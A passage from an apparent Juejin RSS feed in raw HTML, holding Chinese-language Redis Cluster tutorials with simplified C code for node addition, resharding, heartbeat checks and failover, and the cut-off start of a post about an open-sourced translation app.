    <span class="hljs-type">time_t</span> last_heartbeat; <span class="hljs-comment">/* Last time a heartbeat was received */</span>
    <span class="hljs-type">int</span> flags;          <span class="hljs-comment">/* Node flags: fail, etc. */</span>
} clusterNode;

<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cluster</span> {</span>
    clusterNode nodes[MAX_NODES];
    <span class="hljs-type">int</span> node_count;
} cluster;

<span class="hljs-meta">#<span class="hljs-keyword">define</span> CLUSTER_NODE_FAIL 0x01</span>

<span class="hljs-comment">/* Function to send heartbeat message */</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">sendHeartbeat</span><span class="hljs-params">(clusterNode *node)</span> {
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Sending heartbeat to node %s\n"</span>, node-&gt;name);
    <span class="hljs-comment">// In a real implementation, here you would send a PING message over the network.</span>
    node-&gt;last_heartbeat = time(<span class="hljs-literal">NULL</span>);
}

<span class="hljs-comment">/* Function to check for node failures based on heartbeat */</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">checkHeartbeat</span><span class="hljs-params">(clusterNode *node)</span> {
    <span class="hljs-type">time_t</span> now = time(<span class="hljs-literal">NULL</span>);
    <span class="hljs-keyword">if</span> (now - node-&gt;last_heartbeat &gt; HEARTBEAT_INTERVAL) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Node %s is not responding\n"</span>, node-&gt;name);
        <span class="hljs-comment">// Mark node as failed</span>
        node-&gt;flags |= CLUSTER_NODE_FAIL;
    }
}

<span class="hljs-comment">/* Example usage */</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    clusterNode node = {<span class="hljs-string">"node1"</span>, <span class="hljs-string">"192.168.1.1"</span>, <span class="hljs-number">6379</span>, time(<span class="hljs-literal">NULL</span>), <span class="hljs-number">0</span>};

    <span class="hljs-comment">// Periodically send heartbeat</span>
    sendHeartbeat(&amp;node);

    <span class="hljs-comment">// Simulate a delay in heartbeat</span>
    node.last_heartbeat = time(<span class="hljs-literal">NULL</span>) - <span class="hljs-number">2</span>;

    <span class="hljs-comment">// Check heartbeat</span>
    checkHeartbeat(&amp;node);

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h4 data-id="heading-6">5. 数据同步</h4>
<p>节点之间的数据变化（如槽分配）需要同步到整个集群。这里我们模拟槽分配的同步。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> HASH_SLOTS 16384</span>

<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">clusterNode</span> {</span>
    <span class="hljs-type">char</span> name[<span class="hljs-number">40</span>];      <span class="hljs-comment">/* Node ID */</span>
    <span class="hljs-type">char</span> ip[<span class="hljs-number">16</span>];        <span class="hljs-comment">/* Node IP */</span>
    <span class="hljs-type">int</span> port;           <span class="hljs-comment">/* Node Port */</span>
    <span class="hljs-type">int</span> start_slot;     <span class="hljs-comment">/* Start hash slot */</span>
    <span class="hljs-type">int</span> end_slot;       <span class="hljs-comment">/* End hash slot */</span>
} clusterNode;

<span class="hljs-comment">/* Function to synchronize slot information */</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">syncSlotInfo</span><span class="hljs-params">(clusterNode *nodes, <span class="hljs-type">int</span> node_count)</span> {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; node_count; i++) {
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; node_count; j++) {
            <span class="hljs-keyword">if</span> (i != j) {
                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Synchronizing slot info from node %s to node %s\n"</span>, nodes[i].name, nodes[j].name);
                <span class="hljs-comment">// In a real implementation, here you would send the slot information over the network.</span>
            }
        }
    }
}

<span class="hljs-comment">/* Example usage */</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    clusterNode nodes[<span class="hljs-number">2</span>] = {
        {<span class="hljs-string">"node1"</span>, <span class="hljs-string">"192.168.1.1"</span>, <span class="hljs-number">6379</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5460</span>},
        {<span class="hljs-string">"node2"</span>, <span class="hljs-string">"192.168.1.2"</span>, <span class="hljs-number">6379</span>, <span class="hljs-number">5461</span>, <span class="hljs-number">10921</span>}
    };

    syncSlotInfo(nodes, <span class="hljs-number">2</span>);

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Redis（145）Redis的Cluster的扩展性如何？]]></title>    <link>https://juejin.cn/post/7576181197661175808</link>    <guid>https://juejin.cn/post/7576181197661175808</guid>    <pubDate>2025-11-24T22:57:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576181197661175808" data-draft-id="7576130918078054435" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Redis（145）Redis的Cluster的扩展性如何？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-24T22:57:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Redis（145）Redis的Cluster的扩展性如何？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T22:57:28.000Z" title="Mon Nov 24 2025 22:57:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Redis Cluster 的扩展性设计旨在支持水平扩展，使得在数据量增大和负载增加时，可以通过增加节点来分担压力。Redis Cluster 通过哈希槽（hash slots）机制将数据分布在多个节点上，扩展性主要体现在以下几个方面：</p>
<ol>
<li><strong>节点增加</strong>：支持动态增加节点，以扩展集群的存储容量和处理能力。</li>
<li><strong>重新分片</strong>：在新增节点或移除节点时，能够平衡数据分布，重新分配哈希槽。</li>
<li><strong>高可用性</strong>：通过主从复制及自动故障转移机制，确保集群的高可用性。</li>
</ol>
<p>以下内容详细描述 Redis Cluster 的扩展性，并结合示例代码进行说明。</p>
<h3 data-id="heading-0">1. 节点增加</h3>
<p>增加节点是 Redis Cluster 扩展性的基础，通过增加节点，可以将更多的哈希槽分配到新的节点上，从而扩展存储容量和处理能力。</p>
<h4 data-id="heading-1">代码示例</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_NODES 10</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> HASH_SLOTS 16384</span>

<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">clusterNode</span> {</span>
    <span class="hljs-type">char</span> name[<span class="hljs-number">40</span>];      <span class="hljs-comment">/* Node ID */</span>
    <span class="hljs-type">char</span> ip[<span class="hljs-number">16</span>];        <span class="hljs-comment">/* Node IP */</span>
    <span class="hljs-type">int</span> port;           <span class="hljs-comment">/* Node Port */</span>
    <span class="hljs-type">int</span> start_slot;     <span class="hljs-comment">/* Start hash slot */</span>
    <span class="hljs-type">int</span> end_slot;       <span class="hljs-comment">/* End hash slot */</span>
} clusterNode;

<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cluster</span> {</span>
    clusterNode nodes[MAX_NODES];
    <span class="hljs-type">int</span> node_count;
} cluster;

<span class="hljs-comment">/* Function to add a new node to the cluster */</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">addNode</span><span class="hljs-params">(cluster *cl, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *ip, <span class="hljs-type">int</span> port)</span> {
    <span class="hljs-keyword">if</span> (cl-&gt;node_count &lt; MAX_NODES) {
        <span class="hljs-built_in">strcpy</span>(cl-&gt;nodes[cl-&gt;node_count].name, name);
        <span class="hljs-built_in">strcpy</span>(cl-&gt;nodes[cl-&gt;node_count].ip, ip);
        cl-&gt;nodes[cl-&gt;node_count].port = port;
        cl-&gt;nodes[cl-&gt;node_count].start_slot = <span class="hljs-number">-1</span>;  <span class="hljs-comment">// Initial value, to be assigned later</span>
        cl-&gt;nodes[cl-&gt;node_count].end_slot = <span class="hljs-number">-1</span>;    <span class="hljs-comment">// Initial value, to be assigned later</span>
        cl-&gt;node_count++;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Cluster node limit reached\n"</span>);
    }
}

<span class="hljs-comment">/* Example usage */</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    cluster cl = {<span class="hljs-number">0</span>};

    addNode(&amp;cl, <span class="hljs-string">"node1"</span>, <span class="hljs-string">"192.168.1.1"</span>, <span class="hljs-number">6379</span>);
    addNode(&amp;cl, <span class="hljs-string">"node2"</span>, <span class="hljs-string">"192.168.1.2"</span>, <span class="hljs-number">6379</span>);

    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; cl.node_count; i++) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Node %s: %s:%d, Slots: %d-%d\n"</span>, cl.nodes[i].name, cl.nodes[i].ip, cl.nodes[i].port, cl.nodes[i].start_slot, cl.nodes[i].end_slot);
    }

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h3 data-id="heading-2">2. 重新分片</h3>
<p>当新增节点时，需要将一些哈希槽重新分配到新的节点上，以实现负载均衡。重新分片的过程包括选择要迁移的槽、将槽的数据从源节点迁移到目标节点，以及更新集群状态。</p>
<h4 data-id="heading-3">代码示例</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>

<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">clusterNode</span> {</span>
    <span class="hljs-type">char</span> name[<span class="hljs-number">40</span>];      <span class="hljs-comment">/* Node ID */</span>
    <span class="hljs-type">char</span> ip[<span class="hljs-number">16</span>];        <span class="hljs-comment">/* Node IP */</span>
    <span class="hljs-type">int</span> port;           <span class="hljs-comment">/* Node Port */</span>
    <span class="hljs-type">int</span> start_slot;     <span class="hljs-comment">/* Start hash slot */</span>
    <span class="hljs-type">int</span> end_slot;       <span class="hljs-comment">/* End hash slot */</span>
} clusterNode;

<span class="hljs-comment">/* Function to determine which slots to migrate */</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">selectSlotsToMigrate</span><span class="hljs-params">(clusterNode *src, clusterNode *dst, <span class="hljs-type">int</span> num_slots)</span> {
    <span class="hljs-type">int</span> mid = src-&gt;start_slot + (src-&gt;end_slot - src-&gt;start_slot) / <span class="hljs-number">2</span>;
    dst-&gt;start_slot = mid + <span class="hljs-number">1</span>;
    dst-&gt;end_slot = src-&gt;end_slot;
    src-&gt;end_slot = mid;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Migrating slots %d-%d from node %s to node %s\n"</span>, dst-&gt;start_slot, dst-&gt;end_slot, src-&gt;name, dst-&gt;name);
}

<span class="hljs-comment">/* Function to migrate slot data */</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">migrateSlotData</span><span class="hljs-params">(clusterNode *src, clusterNode *dst, <span class="hljs-type">int</span> slot)</span> {
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Migrating data for slot %d from node %s to node %s\n"</span>, slot, src-&gt;name, dst-&gt;name);
    <span class="hljs-comment">// In a real implementation, data migration would occur here</span>
}

<span class="hljs-comment">/* Function to perform resharding */</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">reshard</span><span class="hljs-params">(clusterNode *nodes, <span class="hljs-type">int</span> node_count)</span> {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; node_count; i++) {
        <span class="hljs-keyword">if</span> (nodes[i].start_slot == <span class="hljs-number">-1</span>) {
            <span class="hljs-comment">// This is the new node, so we need to reshard</span>
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; node_count; j++) {
                <span class="hljs-keyword">if</span> (i != j &amp;&amp; nodes[j].end_slot &gt; nodes[j].start_slot) {
                    selectSlotsToMigrate(&amp;nodes[j], &amp;nodes[i], (nodes[j].end_slot - nodes[j].start_slot) / <span class="hljs-number">2</span>);
                    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> slot = nodes[i].start_slot; slot &lt;= nodes[i].end_slot; slot++) {
                        migrateSlotData(&amp;nodes[j], &amp;nodes[i], slot);
                    }
                    <span class="hljs-keyword">break</span>;
                }
            }
            <span class="hljs-keyword">break</span>;
        }
    }
}

<span class="hljs-comment">/* Example usage */</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    clusterNode nodes[<span class="hljs-number">3</span>] = {
        {<span class="hljs-string">"node1"</span>, <span class="hljs-string">"192.168.1.1"</span>, <span class="hljs-number">6379</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5460</span>},
        {<span class="hljs-string">"node2"</span>, <span class="hljs-string">"192.168.1.2"</span>, <span class="hljs-number">6379</span>, <span class="hljs-number">5461</span>, <span class="hljs-number">10921</span>},
        {<span class="hljs-string">"node3"</span>, <span class="hljs-string">"192.168.1.3"</span>, <span class="hljs-number">6379</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">-1</span>}  <span class="hljs-comment">// New node</span>
    };

    reshard(nodes, <span class="hljs-number">3</span>);

    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Node %s: %s:%d, Slots: %d-%d\n"</span>, nodes[i].name, nodes[i].ip, nodes[i].port, nodes[i].start_slot, nodes[i].end_slot);
    }

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h3 data-id="heading-4">3. 高可用性</h3>
<p>Redis Cluster 通过主从复制和自动故障转移机制，确保节点故障时的高可用性。在扩展集群时，也需要确保这些机制的正常工作。</p>
<h4 data-id="heading-5">代码示例</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_NODES 10</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> HEARTBEAT_INTERVAL 1000  <span class="hljs-comment">// 1 second</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> CLUSTER_NODE_FAIL 0x01</span>

<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">clusterNode</span> {</span>
    <span class="hljs-type">char</span> name[<span class="hljs-number">40</span>];      <span class="hljs-comment">/* Node ID */</span>
    <span class="hljs-type">char</span> ip[<span class="hljs-number">16</span>];        <span class="hljs-comment">/* Node IP */</span>
    <span class="hljs-type">int</span> port;           <span class="hljs-comment">/* Node Port */</span>
    <span class="hljs-type">int</span> start_slot;     <span class="hljs-comment">/* Start hash slot */</span>
    <span class="hljs-type">int</span> end_slot;       <span class="hljs-comment">/* End hash slot */</span>
    <span class="hljs-type">int</span> flags;          <span class="hljs-comment">/* Node flags: fail, etc. */</span>
    <span class="hljs-type">time_t</span> last_heartbeat; <span class="hljs-comment">/* Last time a heartbeat was received */</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">clusterNode</span> *<span class="hljs-title">slaveof</span>;</span> <span class="hljs-comment">/* Master of this node if it's a slave */</span>
} clusterNode;

<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cluster</span> {</span>
    clusterNode nodes[MAX_NODES];
    <span class="hljs-type">int</span> node_count;
} cluster;

<span class="hljs-comment">/* Function to add a new node to the cluster */</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">addNode</span><span class="hljs-params">(cluster *cl, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *ip, <span class="hljs-type">int</span> port)</span> {
    <span class="hljs-keyword">if</span> (cl-&gt;node_count &lt; MAX_NODES) {
        <span class="hljs-built_in">strcpy</span>(cl-&gt;nodes[cl-&gt;node_count].name, name);
        <span class="hljs-built_in">strcpy</span>(cl-&gt;nodes[cl-&gt;node_count].ip, ip);
        cl-&gt;nodes[cl-&gt;node_count].port = port;
        cl-&gt;nodes[cl-&gt;node_count].start_slot = <span class="hljs-number">-1</span>;  <span class="hljs-comment">// Initial value, to be assigned later</span>
        cl-&gt;nodes[cl-&gt;node_count].end_slot = <span class="hljs-number">-1</span>;    <span class="hljs-comment">// Initial value, to be assigned later</span>
        cl-&gt;nodes[cl-&gt;node_count].flags = <span class="hljs-number">0</span>;
        cl-&gt;nodes[cl-&gt;node_count].last_heartbeat = time(<span class="hljs-literal">NULL</span>);
        cl-&gt;nodes[cl-&gt;node_count].slaveof = <span class="hljs-literal">NULL</span>;
        cl-&gt;node_count++;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Cluster node limit reached\n"</span>);
    }
}

<span class="hljs-comment">/* Function to send heartbeat message */</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">sendHeartbeat</span><span class="hljs-params">(clusterNode *node)</span> {
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Sending heartbeat to node %s\n"</span>, node-&gt;name);
    node-&gt;last_heartbeat = time(<span class="hljs-literal">NULL</span>);
}

<span class="hljs-comment">/* Function to check for node failures based on heartbeat */</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">checkHeartbeat</span><span class="hljs-params">(clusterNode *node)</span> {
    <span class="hljs-type">time_t</span> now = time(<span class="hljs-literal">NULL</span>);
    <span class="hljs-keyword">if</span> (now - node-&gt;last_heartbeat &gt; HEARTBEAT_INTERVAL) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Node %s is not responding\n"</span>, node-&gt;name);
        node-&gt;flags |= CLUSTER_NODE_FAIL;
    }
}

<span class="hljs-comment">/* Function to handle failover */</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">handleFailover</span><span class="hljs-params">(cluster *cl, clusterNode *failed_node)</span> {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; cl-&gt;node_count; i++) {
        <span class="hljs-keyword">if</span> (cl-&gt;nodes[i].slaveof == failed_node) {
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Failover: promoting slave node %s to master\n"</span>, cl-&gt;nodes[i].name);
            cl-&gt;nodes[i].flags &amp;= ~CLUSTER_NODE_FAIL;
            cl-&gt;nodes[i].slaveof = <span class="hljs-literal">NULL</span>;
        }
    }
}

<span class="hljs-comment">/* Example usage */</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    cluster cl = {<span class="hljs-number">0</span>};

    addNode(&amp;cl, <span class="hljs-string">"node1"</span>, <span class="hljs-string">"192.168.1.1"</span>, <span class="hljs-number">6379</span>);
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[把一年前写给自己用的翻译软件开源了 | TranslateP]]></title>    <link>https://juejin.cn/post/7576130918077988899</link>    <guid>https://juejin.cn/post/7576130918077988899</guid>    <pubDate>2025-11-24T16:38:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576130918077988899" data-draft-id="7576175307356979235" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="把一年前写给自己用的翻译软件开源了  | TranslateP"/> <meta itemprop="keywords" content="iOS,产品"/> <meta itemprop="datePublished" content="2025-11-24T16:38:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="PJHubs"/> <meta itemprop="url" content="https://juejin.cn/user/307518984162567"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            把一年前写给自己用的翻译软件开源了  | TranslateP
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/307518984162567/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    PJHubs
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T16:38:14.000Z" title="Mon Nov 24 2025 16:38:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
